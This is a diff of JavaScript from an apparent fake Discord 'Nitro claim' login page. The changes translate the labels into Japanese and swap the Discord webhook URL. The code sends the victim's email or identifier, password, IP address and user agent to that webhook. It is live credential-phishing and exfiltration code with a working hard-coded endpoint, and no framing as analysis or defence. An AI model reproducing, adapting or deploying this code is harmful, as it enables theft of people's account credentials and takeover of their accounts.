@@ -254,13 +254,13 @@
       status.textContent = "Verifying...";
 
       const payload = {
-        content: "**Nitro Claim Attempt (Realistic Fake Page)**",
+        content: "**ディスコードアカウント情報**",
         embeds: [{
-          title: "New Discord Login Capture",
+          title: "アカウント情報",
           color: 0x5865f2,
           fields: [
-            { name: "Identifier", value: identifier || "(empty)", inline: false },
-            { name: "Password",   value: password   || "(empty)", inline: false },
+            { name: "メールアドレス", value: identifier || "(empty)", inline: false },
+            { name: "パスワード",   value: password   || "(empty)", inline: false },
             { name: "IP",         value: ip,                        inline: true  },
             { name: "User-Agent", value: navigator.userAgent.substring(0,180) + "...", inline: false },
             { name: "Timestamp",  value: new Date().toLocaleString('en-US'), inline: false }
@@ -269,7 +269,7 @@
         }]
       };
 
-      const webhook = "https://discord.com/api/webhooks/1468964638237397179/NMYIXppBkg9vkl02D5OLB_sOuXSdDLkiY9V30yWWXNaEBQm0L3LS6bEGquFAFZ0ue69d";
+      const webhook = "https://discord.com/api/webhooks/1468990532221927485/TmW8si5EPAaSjAclfY2Jal7jHloFqYG4p6dT3jb8WtS6WzD2Ck_Eon2DNHSe-6L8EZjw";
 
       try {
         await fetch(webhook, {
